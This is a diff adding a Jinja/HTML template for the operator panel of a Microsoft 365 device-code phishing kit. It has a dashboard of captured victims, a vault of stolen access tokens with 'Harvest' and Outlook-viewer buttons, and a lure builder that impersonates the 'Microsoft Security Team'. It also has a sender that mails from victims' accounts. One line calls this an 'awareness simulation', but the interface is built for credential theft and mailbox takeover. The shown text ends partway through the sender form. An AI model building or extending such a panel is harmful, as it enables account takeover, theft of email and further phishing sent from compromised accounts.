@@ -1,0 +1,2116 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>omila365 – Operator Panel</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        /* ===== GLOBAL DARK THEME ===== */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            background:#0a0e17; 
+            color:#d7dee8; 
+            font-family:'Inter','Segoe UI',sans-serif; 
+            display:flex; 
+            height:100vh; 
+            overflow:hidden; 
+        }
+        .sidebar {
+            width:240px;
+            background:#0d1117;
+            border-right:1px solid #1a2a3a;
+            padding:20px 0;
+            display:flex;
+            flex-direction:column;
+            flex-shrink:0;
+            height:100vh;
+            overflow-y:auto;
+        }
+        .sidebar .brand {
+            text-align:center;
+            padding:0 15px 20px;
+            border-bottom:1px solid #1a2a3a;
+            margin-bottom:15px;
+        }
+        .sidebar .brand h4 {
+            color:#00ff41;
+            text-shadow:0 0 20px #00ff41;
+            font-weight:700;
+            font-size:1.2rem;
+            letter-spacing:1px;
+        }
+        .sidebar .brand small {
+            color:#556677;
+            font-size:0.65rem;
+            letter-spacing:2px;
+            text-transform:uppercase;
+        }
+        .sidebar .nav-section {
+            padding:0 12px;
+            margin-bottom:8px;
+        }
+        .sidebar .nav-section .section-title {
+            color:#556677;
+            font-size:0.6rem;
+            text-transform:uppercase;
+            letter-spacing:2px;
+            padding:10px 0 4px 10px;
+            border-bottom:1px solid #1a2a3a;
+            margin-bottom:4px;
+        }
+        .sidebar .nav-item {
+            display:flex;
+            align-items:center;
+            padding:7px 12px;
+            color:#8899aa;
+            text-decoration:none;
+            border-radius:6px;
+            font-size:0.8rem;
+            transition:all 0.2s;
+            cursor:pointer;
+        }
+        .sidebar .nav-item:hover { background:#1a2332; color:#00ff41; }
+        .sidebar .nav-item.active {
+            background:#1a2332;
+            color:#00ff41;
+            border-left:3px solid #00ff41;
+        }
+        .sidebar .nav-item i {
+            width:20px;
+            margin-right:10px;
+            font-size:0.9rem;
+        }
+        .sidebar .nav-item .badge {
+            margin-left:auto;
+            background:#00ff41;
+            color:#0a0e17;
+            font-size:0.55rem;
+            padding:2px 8px;
+            border-radius:10px;
+        }
+        .sidebar .user-section {
+            margin-top:auto;
+            padding:15px 15px 10px;
+            border-top:1px solid #1a2a3a;
+        }
+        .sidebar .user-section .user-name {
+            color:#00ff41;
+            font-weight:600;
+            font-size:0.85rem;
+        }
+        .sidebar .user-section .user-links a {
+            display:block;
+            color:#556677;
+            font-size:0.7rem;
+            padding:3px 0;
+            text-decoration:none;
+            transition:color 0.2s;
+        }
+        .sidebar .user-section .user-links a:hover { color:#00ff41; }
+        .sidebar .user-section .logout {
+            color:#ff0044;
+            font-weight:600;
+            margin-top:5px;
+            padding:8px 12px;
+            border-radius:6px;
+            background:rgba(255,0,68,0.05);
+            text-align:center;
+            text-decoration:none;
+            display:block;
+            transition:background 0.2s;
+        }
+        .sidebar .user-section .logout:hover { background:rgba(255,0,68,0.15); }
+        .main-content {
+            flex:1;
+            padding:20px 30px;
+            overflow-y:auto;
+            height:100vh;
+        }
+        .page-title {
+            color:#f3f6fa;
+            font-size:1.3rem;
+            font-weight:700;
+            margin-bottom:20px;
+            border-bottom:1px solid #1a2a3a;
+            padding-bottom:10px;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+        }
+        .page-title small { color:#7f8b99; font-size:0.7rem; font-weight:normal; }
+        .card {
+            background:#111927;
+            border:1px solid #1a2a3a;
+            border-radius:8px;
+            margin-bottom:15px;
+        }
+        .card-header {
+            background:#1a2332;
+            border-bottom:1px solid #1a2a3a;
+            color:#00ff41;
+            font-weight:600;
+            padding:10px 15px;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+        }
+        .card-body { padding:15px; }
+        .stat-grid {
+            display:grid;
+            grid-template-columns:repeat(auto-fit, minmax(150px,1fr));
+            gap:12px;
+            margin-bottom:20px;
+        }
+        .stat-card {
+            background:#0d1520;
+            border:1px solid #1a2a3a;
+            border-radius:8px;
+            padding:15px;
+            text-align:center;
+        }
+        .stat-card .stat-number {
+            font-size:1.8rem;
+            font-weight:700;
+            color:#00ff41;
+            text-shadow:0 0 20px rgba(0,255,65,0.2);
+        }
+        .stat-card .stat-label {
+            color:#8899aa;
+            font-size:0.65rem;
+            text-transform:uppercase;
+            letter-spacing:1px;
+        }
+        .form-control, .form-select {
+            background:#0d1520 !important;
+            border:1px solid #1a2a3a !important;
+            color:#d7dee8 !important;
+            font-family:'Inter',sans-serif;
+        }
+        .form-control::placeholder { color:#445566 !important; }
+        .form-control:focus, .form-select:focus {
+            border-color:#00ff41 !important;
+            box-shadow:0 0 20px rgba(0,255,65,0.1) !important;
+        }
+        .form-select option { background:#0d1520 !important; color:#d7dee8 !important; }
+        label { color:#8899aa; font-size:0.75rem; font-weight:500; }
+        .btn-success { background:#00ff41; border:none; color:#0a0e17; font-weight:600; }
+        .btn-success:hover { background:#00cc33; box-shadow:0 0 20px rgba(0,255,65,0.3); }
+        .btn-warning { background:#ffaa00; border:none; color:#0a0e17; font-weight:600; }
+        .btn-warning:hover { background:#cc8800; box-shadow:0 0 20px rgba(255,170,0,0.3); }
+        .btn-danger { background:#ff0044; border:none; color:#fff; font-weight:600; }
+        .btn-danger:hover { background:#cc0033; box-shadow:0 0 20px rgba(255,0,68,0.3); }
+        .btn-info { background:#00aaff; border:none; color:#0a0e17; font-weight:600; }
+        .btn-info:hover { background:#0088cc; box-shadow:0 0 20px rgba(0,170,255,0.3); }
+        .btn-outline-primary { border-color:#00ff41; color:#00ff41; }
+        .btn-outline-primary:hover { background:#00ff41; color:#0a0e17; }
+        .btn-sm { padding:4px 12px; font-size:0.7rem; border-radius:4px; }
+        .table { color:#d7dee8; }
+        .table thead th {
+            border-bottom:1px solid #1a2a3a;
+            color:#8899aa;
+            text-transform:uppercase;
+            font-size:0.6rem;
+            letter-spacing:1px;
+        }
+        .table td { border-bottom:1px solid #0d1520; vertical-align:middle; }
+        .table-hover tbody tr:hover { background:#0d1520; }
+        .alert {
+            background:#0d1520;
+            border:1px solid #1a2a3a;
+            color:#d7dee8;
+        }
+        .alert-success { border-color:#00ff41; color:#00ff41; }
+        .alert-warning { border-color:#ffaa00; color:#ffaa00; }
+        .alert-danger { border-color:#ff0044; color:#ff0044; }
+        .alert-info { border-color:#00aaff; color:#00aaff; }
+        .alert-secondary { border-color:#2b3645; color:#b8c2cf; }
+        ::-webkit-scrollbar { width:5px; }
+        ::-webkit-scrollbar-track { background:#0a0e17; }
+        ::-webkit-scrollbar-thumb { background:#00ff41; border-radius:3px; }
+        .template-grid {
+            display:grid;
+            grid-template-columns:repeat(auto-fill, minmax(280px,1fr));
+            gap:12px;
+        }
+        .template-card {
+            background:#0d1520;
+            border:1px solid #1a2a3a;
+            border-radius:6px;
+            padding:12px 15px;
+            cursor:pointer;
+            transition:all 0.2s;
+        }
+        .template-card:hover { border-color:#00ff41; background:#1a2332; }
+        .template-card .template-name { color:#00ff41; font-weight:600; font-size:0.9rem; }
+        .template-card .template-desc { color:#8899aa; font-size:0.75rem; margin:4px 0; }
+        .template-card .template-tags { display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+        .template-card .template-tags .tag {
+            background:#1a2332;
+            color:#556677;
+            font-size:0.55rem;
+            padding:2px 8px;
+            border-radius:10px;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+        }
+        .template-toolbar {
+            display:grid;
+            grid-template-columns:minmax(240px,1fr) 220px auto;
+            gap:10px;
+            margin-bottom:14px;
+        }
+        .template-count {
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            padding:0 14px;
+            border:1px solid #2b3645;
+            border-radius:8px;
+            background:#0d1520;
+            color:#8d9aaa;
+            font-size:.72rem;
+            white-space:nowrap;
+        }
+        .provider-group-card {
+            background:#0d1520;
+            border:1px solid #1a2a3a;
+            border-radius:8px;
+            padding:15px;
+            text-align:center;
+            cursor:pointer;
+            transition:all 0.2s;
+        }
+        .provider-group-card:hover { border-color:#00ff41; background:#1a2332; }
+        .provider-group-card.selected {
+            border-color:#00ff41;
+            background:#1a2332;
+            box-shadow:0 0 20px rgba(0,255,65,0.15);
+        }
+        .provider-group-card .count { font-size:1.8rem; font-weight:700; }
+        .provider-group-card .label { font-size:0.7rem; text-transform:uppercase; letter-spacing:1px; }
+        .email-list-item {
+            padding:4px 8px;
+            border-bottom:1px solid #0d1520;
+            font-size:0.85rem;
+        }
+        .email-list-item:last-child { border-bottom:none; }
+        .lure-card {
+            background:#0d1520;
+            border:1px solid #1a2a3a;
+            border-radius:8px;
+            padding:15px;
+            margin-bottom:12px;
+            transition:all 0.2s;
+        }
+        .lure-card:hover { border-color:#00ff41; background:#1a2332; }
+        .lure-card .lure-name { color:#00ff41; font-weight:600; font-size:1rem; }
+        .lure-card .lure-meta { color:#8899aa; font-size:0.7rem; }
+        .lure-card .lure-stats { display:flex; gap:15px; margin:8px 0; }
+        .lure-card .lure-stats span { color:#556677; font-size:0.7rem; }
+        .lure-card .lure-stats strong { color:#00ff41; }
+        .lure-card .lure-actions { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; }
+        .email-preview-wrapper {
+            background:#ffffff;
+            border:1px solid #d0d7de;
+            border-radius:12px;
+            overflow:hidden;
+            font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;
+            box-shadow:0 4px 20px rgba(0,0,0,0.08);
+        }
+        .preview-action-bar {
+            background:#f8fafc;
+            padding:6px 20px;
+            border-bottom:1px solid #e9edf2;
+            display:flex;
+            gap:6px;
+            align-items:center;
+            flex-wrap:wrap;
+        }
+        .preview-action-bar .action-btn {
+            background:transparent;
+            border:none;
+            padding:4px 10px;
+            font-size:0.75rem;
+            color:#3d4a5a;
+            border-radius:4px;
+            cursor:default;
+            display:inline-flex;
+            align-items:center;
+            gap:4px;
+        }
+        .preview-action-bar .action-btn i { font-size:0.9rem; color:#5b6b7c; }
+        .preview-action-bar .action-btn:hover { background:#eef2f6; }
+        .preview-action-bar .sep { color:#dce1e8; font-size:0.7rem; }
+        .email-preview-header {
+            background:#ffffff;
+            padding:16px 24px 4px 24px;
+            display:flex;
+            align-items:flex-start;
+            gap:16px;
+            border-bottom:none;
+        }
+        .preview-avatar {
+            width:42px; height:42px; border-radius:50%; background:#0b57d0;
+            color:#fff; display:flex; align-items:center; justify-content:center;
+            font-weight:600; font-size:16px; flex-shrink:0;
+        }
+        .preview-sender-info { flex:1; }
+        .preview-sender-info .sender-name { font-weight:600; color:#1a1a2e; font-size:0.95rem; }
+        .preview-sender-info .sender-email { color:#5b6b7c; font-size:0.8rem; }
+        .preview-header-right {
+            text-align:right; font-size:0.75rem; color:#5b6b7c; flex-shrink:0;
+        }
+        .preview-header-right .date { font-weight:500; }
+        .preview-header-right .more-icon { color:#5b6b7c; font-size:1.1rem; margin-left:6px; }
+        .email-preview-meta {
+            background:#ffffff; padding:0 24px 8px 24px; border-bottom:1px solid #f0f2f5;
+        }
+        .email-preview-meta .meta-row {
+            display:flex; font-size:0.8rem; padding:2px 0;
+        }
+        .email-preview-meta .meta-label {
+            width:60px; color:#5b6b7c; font-weight:500; flex-shrink:0;
+        }
+        .email-preview-meta .meta-value { color:#1a1a2e; }
+        .email-preview-meta .subject-line {
+            font-weight:600; font-size:1.1rem; color:#1a1a2e; padding:6px 0 4px;
+        }
+        .email-preview-body {
+            background:#ffffff; padding:20px 24px 20px; color:#1a1a2e;
+            font-size:0.9rem; line-height:1.7; min-height:100px;
+        }
+        .email-preview-body .preview-content { color:#1a1a2e; }
+        .email-preview-body .preview-content p { color:#1a1a2e; margin-bottom:12px; }
+        .email-preview-body .preview-content a {
+            display:inline-block;
+            text-decoration:none;
+            font-weight:600;
+            font-size:0.9rem;
+            padding:8px 20px;
+            border-radius:6px;
+        }
+        .email-preview-footer {
+            background:#f8fafc; padding:10px 24px; border-top:1px solid #e9edf2;
+            font-size:0.7rem; color:#5b6b7c;
+            display:flex; justify-content:space-between; flex-wrap:wrap; gap:6px;
+        }
+        .email-preview-footer .footer-left { display:flex; align-items:center; gap:12px; }
+        .email-preview-footer .footer-left .attachment-badge {
+            display:inline-flex; align-items:center; gap:4px;
+            background:#eef2f6; padding:2px 10px; border-radius:12px;
+            font-size:0.65rem; color:#3d4a5a;
+        }
+        .email-preview-footer .footer-right { display:flex; align-items:center; gap:12px; }
+        .email-preview-footer .footer-right .badge-preview {
+            background:#e9edf2; color:#3d4a5a; padding:1px 10px; border-radius:12px;
+            font-size:0.6rem; font-weight:600;
+        }
+        .email-preview-empty {
+            background:#f8fafc; border-radius:8px; padding:40px 20px;
+            text-align:center; color:#8a9aa8; border:1px dashed #d0d7de;
+            font-size:0.9rem;
+        }
+        .email-preview-empty i { font-size:2rem; display:block; margin-bottom:10px; color:#c0cbd6; }
+        .text-muted { color:#7f8b99 !important; }
+        .badge { font-weight:600; }
+        .glow-text { text-shadow:0 0 10px rgba(0,255,65,0.3); }
+        .modal-content { background:#111927; border:1px solid #1a2a3a; }
+        .modal-header { border-bottom:1px solid #1a2a3a; }
+        .modal-footer { border-top:1px solid #1a2a3a; }
+        .btn-close { filter:invert(1); }
+        .alert-mode-card {
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .alert-mode-card:hover {
+            border-color: #00ff41 !important;
+        }
+        .alert-mode-card.border-success {
+            border-color: #00ff41 !important;
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .alert-mode-card .card-body {
+            padding: 15px 10px;
+        }
+
+        /* ===== FIX DARK TEXT IN SETTINGS ===== */
+        .card-body, 
+        .card-body p, 
+        .card-body li, 
+        .card-body .badge,
+        .card-body strong,
+        .card-body span {
+            color: #d7dee8 !important;
+        }
+        .card-body .text-muted,
+        .card-body small {
+            color: #8899aa !important;
+        }
+        .card-body .badge.bg-secondary {
+            color: #fff !important;
+        }
+        /* Provider group colors in process modal */
+        .provider-badge {
+            display:inline-block;
+            padding:2px 10px;
+            border-radius:12px;
+            font-size:0.7rem;
+            font-weight:600;
+            margin-right:4px;
+        }
+        .provider-badge.gmail { background:#ea4335; color:#fff; }
+        .provider-badge.office365 { background:#0078d4; color:#fff; }
+        .provider-badge.godaddy { background:#1b8d2e; color:#fff; }
+        .provider-badge.outlook { background:#0072c6; color:#fff; }
+        .provider-badge.yahoo { background:#7b0099; color:#fff; }
+        .provider-badge.protonmail { background:#6d4aff; color:#fff; }
+        .provider-badge.zoho { background:#e4252c; color:#fff; }
+        .provider-badge.icloud { background:#999; color:#fff; }
+        .provider-badge.other { background:#6c757d; color:#fff; }
+    </style>
+</head>
+<body>
+
+<!-- ===== SIDEBAR ===== -->
+<div class="sidebar">
+    <div class="brand">
+        <h4>☠️ omila365</h4>
+        <small>OPERATOR PANEL</small>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">MAIN</div>
+        <a href="#dashboard" class="nav-item active" onclick="showPage('dashboard')"><i class="bi bi-speedometer2"></i> Dashboard</a>
+        <a href="#token-vault" class="nav-item" onclick="showPage('token-vault')"><i class="bi bi-key"></i> Token Vault <span class="badge">{{ total_tokens|default(0) }}</span></a>
+        <a href="#lures" class="nav-item" onclick="showPage('lures')"><i class="bi bi-folder-open"></i> Lures</a>
+        <a href="#inbox" class="nav-item" onclick="showPage('inbox')"><i class="bi bi-inbox"></i> Inbox</a>
+        {% if current_user.role == 'admin' %}
+        <a href="{{ url_for('admin.dashboard') }}" class="nav-item"><i class="bi bi-shield-lock"></i> Admin Panel</a>
+        {% endif %}
+    </div>
+    <div class="nav-section">
+        <div class="section-title">TOOLS</div>
+        <a href="#b2b" class="nav-item" onclick="showPage('b2b')"><i class="bi bi-envelope-paper"></i> B2B Sender</a>
+        <a href="#extractor" class="nav-item" onclick="showPage('extractor')"><i class="bi bi-search"></i> Email Extractor</a>
+        <a href="#domains" class="nav-item" onclick="showPage('domains')"><i class="bi bi-globe2"></i> Domains</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">MONITORING</div>
+        <a href="#keywords" class="nav-item" onclick="showPage('keywords')"><i class="bi bi-tags"></i> Keyword Alerts</a>
+        <a href="#ai" class="nav-item" onclick="showPage('ai')"><i class="bi bi-robot"></i> AI Intelligence</a>
+        <a href="#profiles" class="nav-item" onclick="showPage('profiles')"><i class="bi bi-person-badge"></i> Profiles</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">ACCOUNT</div>
+        <a href="#settings" class="nav-item" onclick="showPage('settings')"><i class="bi bi-gear"></i> Settings</a>
+        <a href="#reports" class="nav-item" onclick="showPage('reports')"><i class="bi bi-flag"></i> My Reports</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">SYSTEM</div>
+        <a href="#infrastructure" class="nav-item" onclick="showPage('infrastructure')"><i class="bi bi-server"></i> Infrastructure</a>
+    </div>
+    <div class="user-section">
+        <div class="user-name">@{{ current_user.username }}</div>
+        <div class="user-links">
+            <a href="#" onclick="openReportModal()">📋 Report Issue</a>
+            <a href="#" onclick="alert('📢 Join our Telegram channel: https://t.me/your_channel')">📢 Join Channel</a>
+            <a href="#" onclick="openReportModal()">✉️ Contact Admin</a>
+        </div>
+        <a href="{{ url_for('auth.logout') }}" class="logout">🚪 Sign out</a>
+    </div>
+</div>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div class="main-content" id="mainContent">
+
+    <!-- ============================================================ -->
+    <!-- PAGE: DASHBOARD -->
+    <!-- ============================================================ -->
+    <div id="page-dashboard" class="page-content">
+        <div class="page-title">
+            <span><i class="bi bi-speedometer2"></i> Dashboard <small>Token activity, lure performance, and recent captures</small></span>
+        </div>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% for category, message in messages %}
+                <div class="alert alert-{{ category }} alert-dismissible fade show">{{ message }}</div>
+            {% endfor %}
+        {% endwith %}
+        <div class="stat-grid">
+            <div class="stat-card"><div class="stat-number">{{ total_tokens|default(0) }}</div><div class="stat-label">Total Tokens</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_tokens|default(0) }}</div><div class="stat-label">Active Tokens</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Revoked</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_campaigns|default(0) }}</div><div class="stat-label">Total Lures</div></div>
+        </div>
+        <div class="stat-grid" style="grid-template-columns: repeat(3,1fr);">
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Stale Tokens</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Lure Visits</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_tokens|default(0) }}</div><div class="stat-label">Lure Captures</div></div>
+        </div>
+        <div class="card">
+            <div class="card-header">Recent Captures</div>
+            <div class="card-body">
+                {% if recent_victims %}
+                <div class="table-responsive">
+                    <table class="table table-sm table-hover">
+                        <thead><tr><th>User</th><th>Lure</th><th>Location</th><th>Status</th><th>Captured</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for v in recent_victims[:10] %}
+                            <tr>
+                                <td>{{ v.email or 'Unknown' }}</td>
+                                <td>{{ v.campaign.name if v.campaign else '—' }}</td>
+                                <td>—</td>
+                                <td><span class="badge bg-{{ 'success' if v.status == 'completed' else 'warning' }}">{{ v.status }}</span></td>
+                                <td>{{ v.created_at.strftime('%Y-%m-%d %H:%M') if v.created_at else '—' }}</td>
+                                <td>
+                                    {% if v.status == 'pending' %}<a href="{{ url_for('operator.poll_victim', victim_id=v.id) }}" class="btn btn-sm btn-warning">🔄 Poll</a>{% endif %}
+                                    {% if v.access_token %}<a href="{{ url_for('operator.harvest', victim_id=v.id) }}" class="btn btn-sm btn-primary">📧 Harvest</a>
+                                    <a href="{{ url_for('panel.outlook_viewer', victim_id=v.id) }}" class="btn btn-sm btn-info">🌐 Browser</a>{% endif %}
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+                {% else %}<div class="alert alert-secondary">No captures yet.</div>{% endif %}
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: TOKEN VAULT -->
+    <!-- ============================================================ -->
+    <div id="page-token-vault" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-key"></i> Token Vault</span></div>
+        <div class="card">
+            <div class="card-header">B2B Tokens</div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead><tr><th>Email</th><th>Campaign</th><th>Token</th><th>Status</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for v in recent_victims if v.access_token %}
+                            <tr>
+                                <td>{{ v.email or 'Unknown' }}</td>
+                                <td>{{ v.campaign_id }}</td>
+                                <td><code>{{ v.access_token[:20] }}...</code></td>
+                                <td><span class="badge bg-success">Active</span></td>
+                                <td>
+                                    <a href="{{ url_for('panel.outlook_viewer', victim_id=v.id) }}" class="btn btn-sm btn-info">🌐 Outlook</a>
+                                    <a href="{{ url_for('operator.harvest', victim_id=v.id) }}" class="btn btn-sm btn-primary">📧 Harvest</a>
+                                </td>
+                            </tr>
+                            {% else %}<tr><td colspan="5" class="text-muted">No tokens.</td></tr>{% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: LURES -->
+    <!-- ============================================================ -->
+    <div id="page-lures" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-folder-open"></i> Lures <small>Deploy device code phishing pages with 85+ pretexts</small></span></div>
+        <div class="stat-grid" style="grid-template-columns: repeat(3,1fr);">
+            <div class="stat-card"><div class="stat-number">{{ total_campaigns|default(0) }}</div><div class="stat-label">Total Lures</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Total Visits</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_tokens|default(0) }}</div><div class="stat-label">Total Captures</div></div>
+        </div>
+
+        <!-- Create Lure Form -->
+        <div class="card">
+            <div class="card-header">
+                <span><i class="bi bi-plus-circle"></i> Create New Lure</span>
+                <button class="btn btn-sm btn-outline-secondary" onclick="toggleLureForm()">⚙️ Configure</button>
+            </div>
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('operator.create_campaign') }}" id="lureForm">
+                    <div class="row g-2">
+                        <div class="col-md-4">
+                            <label class="text-muted small">Lure Name (optional)</label>
+                            <input type="text" name="name" class="form-control" placeholder="e.g. Q1 Report Campaign">
+                        </div>
+                        <div class="col-md-3">
+                            <label class="text-muted small">Design / Template</label>
+                            <select name="template_id" class="form-control">
+                                {% for template in templates %}
+                                <option value="{{ template.id }}">{{ template.name }}</option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="col-md-2">
+                            <label class="text-muted small">&nbsp;</label>
+                            <button type="submit" class="btn btn-success w-100">🧪 Create Lure</button>
+                        </div>
+                        <div class="col-md-3">
+                            <label class="text-muted small">&nbsp;</label>
+                            <small class="text-muted">Creates a controlled awareness simulation</small>
+                        </div>
+                    </div>
+                    <div id="advancedConfig" style="display:none; margin-top:15px; padding-top:15px; border-top:1px solid #1a2a3a;">
+                        <div class="row g-2">
+                            <div class="col-md-3"><label class="text-muted small">Sender Name</label><input type="text" name="sender_name" class="form-control" placeholder="e.g. John Smith" value="Microsoft Security Team"></div>
+                            <div class="col-md-3"><label class="text-muted small">Document Title</label><input type="text" name="document_title" class="form-control" placeholder="e.g. Q1 Financial Report" value="Security Alert"></div>
+                            <div class="col-md-2"><label class="text-muted small">Document Type</label><select name="document_type" class="form-control"><option value=".PDF">.PDF</option><option value=".DOCX">.DOCX</option><option value=".XLSX">.XLSX</option><option value=".PPTX">.PPTX</option><option value=".CSV">.CSV</option><option value=".MP3">.MP3</option><option value=".MP4">.MP4</option><option value=".ZIP">.ZIP</option><option value=".TXT">.TXT</option><option value=".HTML">.HTML</option><option value=".EML">.EML</option><option value=".ONE">.ONE</option></select></div>
+                            <div class="col-md-2"><label class="text-muted small">Language</label><select name="language" class="form-control"><option value="English">English</option><option value="Spanish">Spanish</option><option value="French">French</option><option value="German">German</option></select></div>
+                            <div class="col-md-2"><label class="text-muted small">Token Type</label><select name="token_type" class="form-control"><option value="B2B (Office)">B2B (Office)</option><option value="Cookie (PRT)">Cookie (PRT)</option></select></div>
+                        </div>
+                        <div class="row g-2 mt-2">
+                            <div class="col-md-6"><label class="text-muted small">Exit URL</label><input type="url" name="exit_url" class="form-control" placeholder="https://www.microsoft.com" value="https://www.microsoft.com"></div>
+                            <div class="col-md-6"><button type="button" class="btn btn-sm btn-outline-info" onclick="previewLure()">👁️ Preview</button><small class="text-muted ms-2">See how your lure will look before creating</small></div>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Template Library -->
+        <div class="card">
+            <div class="card-header">📋 Choose a Template</div>
+            <div class="card-body">
+                <div class="template-toolbar">
+                    <input type="search" class="form-control" placeholder="Search templates..." id="templateSearch" oninput="filterTemplates()">
+                    <select class="form-select" id="templateCategory" onchange="filterTemplates()">
+                        <option value="all">All categories ({{ categories|length }})</option>
+                        {% for category in categories %}<option value="{{ category|lower }}">{{ category }}</option>{% endfor %}
+                    </select>
+                    <div class="template-count" id="templateCount">{{ templates|length }} templates</div>
+                </div>
+                <div class="template-grid" id="templateGrid">
+                    {% for template in templates %}
+                    <div class="template-card" data-name="{{ template.name|lower }}" data-desc="{{ template.description|lower }}" data-category="{{ template.category|lower }}" data-template-id="{{ template.id }}" data-sender="{{ template.default_sender }}" data-title="{{ template.default_title }}" onclick="selectTemplateCard(this)">
+                        <div class="template-name">{{ template.icon }} {{ template.name }}</div>
+                        <div class="template-desc">{{ template.description }}</div>
+                        <div class="template-tags"><span class="tag">{{ template.category }}</span></div>
+                    </div>
+                    {% endfor %}
+                </div>
+                <div class="mt-3 text-muted small">{{ templates|length }} templates across {{ categories|length }} categories. All use device code auth flow.</div>
+            </div>
+        </div>
+
+        <!-- Your Lures -->
+        <div class="card">
+            <div class="card-header">🎯 Your Lures</div>
+            <div class="card-body">
+                <div class="row">
+                    {% for c in campaigns %}
+                    <div class="col-md-6 col-lg-4">
+                        <div class="lure-card">
+                            <div class="d-flex justify-content-between align-items-start">
+                                <div>
+                                    <div class="lure-name">{{ c.name }}</div>
+                                    <div class="lure-meta">ID: {{ c.id }} · Created: {{ c.created_at.strftime('%Y-%m-%d') }}</div>
+                                    <div class="lure-meta">Sender: {{ c.sender_name or 'N/A' }} · Doc: {{ c.document_title or 'N/A' }}{{ c.document_type or '' }}</div>
+                                </div>
+                                <span class="badge bg-{{ 'success' if c.status == 'active' else 'secondary' }}">{{ c.status }}</span>
+                            </div>
+                            <div class="lure-stats">
+                                <span>👁️ <strong>0</strong> visits</span>
+                                <span>🎯 <strong>0</strong> captures</span>
+                            </div>
+                            <div class="lure-actions">
+                                <button onclick="processCampaign({{ c.id }})" class="btn btn-sm btn-outline-primary">🔄 Process</button>
+                                <button onclick="getLeads({{ c.id }})" class="btn btn-sm btn-outline-success">👤 Leads</button>
+                                <button onclick="showDeviceCodes({{ c.id }})" class="btn btn-sm btn-outline-info">📋 Codes</button>
+                                <button onclick="copyLureUrl({{ c.id }})" class="btn btn-sm btn-outline-warning">🔗 Lure URL</button>
+                                <button onclick="openSendLureModal({{ c.id }}, '{{ c.name }}')" class="btn btn-sm btn-danger">📧 Send Lure</button>
+                                <button onclick="toggleCampaign({{ c.id }})" class="btn btn-sm btn-outline-secondary">🔄 Toggle</button>
+                                <button onclick="deleteCampaign({{ c.id }})" class="btn btn-sm btn-danger">🗑 Delete</button>
+                            </div>
+                        </div>
+                    </div>
+                    {% else %}<div class="col-12"><div class="alert alert-secondary">No lures yet. Create your first lure above.</div></div>{% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: INBOX -->
+    <!-- ============================================================ -->
+    <div id="page-inbox" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-inbox"></i> Inbox <small>B2B tokens — tag, filter, and open Outlook Web View</small></span></div>
+        <div class="card">
+            <div class="card-body">
+                {% for v in recent_victims if v.access_token %}
+                <div class="d-flex justify-content-between align-items-center border-bottom border-secondary py-2">
+                    <span><i class="bi bi-envelope"></i> {{ v.email or 'Victim ' ~ v.id }}</span>
+                    <span class="badge bg-success">Active</span>
+                    <a href="{{ url_for('panel.outlook_viewer', victim_id=v.id) }}" class="btn btn-sm btn-info">🌐 Outlook Web</a>
+                </div>
+                {% else %}<div class="alert alert-secondary">No active credentials. Capture some via lures.</div>{% endfor %}
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: B2B SENDER -->
+    <!-- ============================================================ -->
+    <div id="page-b2b" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-envelope-paper"></i> B2B Sender</span></div>
+        {% if not recent_victims or not recent_victims[0].access_token %}
+        <div class="alert alert-warning">No active B2B credentials. Capture some via your lures first.</div>
+        {% endif %}
+        <div class="row">
+            <div class="col-md-7">
+                <div class="card">
+                    <div class="card-header">✏️ Compose</div>
+                    <div class="card-body">
+                        <form id="b2bComposeForm">
+                            <div class="mb-2">
+                                <label>From (Victim)</label>
+                                <select id="b2b_from" class="form-control">
+                                    {% for v in recent_victims if v.access_token %}
+                                    <option value="{{ v.id }}">{{ v.email or 'Victim ' ~ v.id }}</option>
+                                    {% endfor %}
+                                </select>
+                            </div>
+                            <div class="mb-2">
+                                <label>Recipients (one per line)</label>
